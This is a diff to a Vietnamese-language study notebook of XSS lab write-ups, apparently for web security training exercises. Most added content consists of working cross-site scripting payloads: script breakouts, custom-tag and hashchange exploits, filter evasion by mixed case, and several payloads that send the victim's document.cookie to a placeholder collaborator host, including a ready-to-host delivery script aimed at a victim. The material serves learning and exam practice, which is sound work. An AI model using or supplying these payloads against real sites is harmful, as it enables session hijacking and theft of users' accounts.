@@ -460,11 +460,120 @@ khi gửi đến victim đưa vào iframe
 
 
 
-- [ ] **30/4** — Reflected XSS into HTML context with nothing encoded
-- [ ] **1/5** — Reflected XSS into HTML context with all tags blocked except custom ones
-- [ ] **2/5** — DOM XSS in jQuery selector sink using a hashchange event
+### Reflected XSS into HTML context with nothing encoded
+
+Test XSS trong hoàn cảnh chức năng search không được encode đúng cách 
+
+Gán giao thức `javascript` với  `location.protocal` là 1 thuộc tính của đối tượng `window.location`
+
+`javascript` là 1 giao thức đặc biệt có thể thực thi được mã code 
+
+`%0a` đại diện kí tự xuống dòng trong ASCII 
+
+![alt text](image-39.png)
+
+
+### Reflected XSS into HTML context with all tags blocked except custom ones
+
+Bài này phải custom tag thì mới xss đc; Payload như sau
+
+```code
+<xss+id=x>#x';
+```
+
+Payload lúc sau đưa sự kiện `onfocus` vào và `trigger` sự kiện `document.location` 
+
+Kí tự hash `#` đặt cuối `url` khiến cho việc tập trung xử lí phần tử ngay khi page được load 
+
+Payload lúc sau 
+
+```code!
+<script>
+location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
+</script>
+```
+![alt text](image-40.png)
+### DOM XSS in jQuery selector sink using a hashchange event
+
+Payload dưới đây dùng `#` ở cuối url để trigger sự kiện OnHashChange của XSS 
+
+```code
+<iframe src="https://TARGET.net/#" onload="document.location='http://OASTIFY.COM/?cookies='+document.cookie"></iframe>
+```
+
+**Lưu ý** : Nếu cookie được set HTTPOnly thì k thể bị steal 
+
+Payload sau perform skill print 
+
+```code
+<iframe src="https://TARGET.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+```
+
+Tồn tại vul trong jquery 1.8.2 liên quan đến việc CSS selector thực thi sự kiện hashchange
+
+![alt text](image-41.png)
+
+
+
 - [ ] **3/5** — Reflected XSS into a JavaScript string with single quote and backslash escaped
-- [ ] **4/5** — Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+![alt text](image-42.png)
+
+Quan sát thấy biến `searchTerms` được reflect trong source code 
+ 
+
+![alt text](image-43.png)
+
+Test payload với `test'payload`  ta nhận được `\` để escape khỏi việc breaking chuỗi 
+
+Sử dụng payload sau 
+
+```code
+</script><script>alert(1)</script>
+```
+
+Paylaod sau để cướp cookie
+
+```code
+</script><script>document.location="https://OASTIFY.COM/?cookie="+document.cookie</script>
+```
+
+Trong khi thi dùng payload sau để host lên server và gửi cho victim 
+
+```code
+<script>
+location = "https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FOASTIFY.COM%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E"
+</script>
+
+```
+
+Nếu `script` bị chặn thì dùng `ScRiPt`
+
+
+### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+
+![alt text](image-44.png)
+
+Ta thấy context bị escape bới payload  `tung\'tung`
+
+Và sau đây là 1 vài payload có thể dùng để chèn vào biến search 
+
+```code
+\'-alert(1)//  
+
+fuzzer\';console.log(12345);//  
+
+fuzzer\';alert(`Testing The backtick a typographical mark used mainly in computing`);//
+```
+![alt text](image-46.png)
+Sử dùng back stick để đóng gói url
+
+```code
+\';document.location=`https://OASTIFY.COM/?BackTicks=`+document.cookie;//
+```
+
+![alt text](image-45.png)
+
+
 - [ ] **5/5** — Reflected XSS with AngularJS sandbox escape without strings
 - [ ] **6/5** — Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
 - [ ] **7/5** — Practice Exam Stage 1 — XSS via JSON into EVAL
